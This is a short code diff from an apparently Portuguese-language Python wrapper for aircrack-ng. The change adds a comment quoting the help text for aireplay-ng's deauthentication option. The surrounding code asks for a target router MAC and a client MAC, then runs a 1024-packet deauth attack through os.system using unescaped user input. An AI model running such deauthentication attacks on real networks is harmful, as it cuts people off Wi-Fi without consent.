@@ -44,7 +44,7 @@ def tipo_attack():
     opcao_attack = open('tipo_attacks.txt')
     print(opcao_attack.read())
     opcao_escolhida = input('>>> ')
-    if opcao_escolhida == '-0':
+    if opcao_escolhida == '-0':  #      --deauth      count : deauthenticate 1 or all stations (-0) 
         mac_alvo = str(input('Digite o MAC Router Destino: Exemplo: 54B80AF33FC3 >>>  '))
         mac_usuario = str(input('Digite o MAC Cliente Router Destino: Exemplo: B85A73AC60CC >>>  '))
         os.system('aireplay-ng -0 1024 -a ' +mac_alvo+ ' -c ' +mac_usuario+ ' mon0')
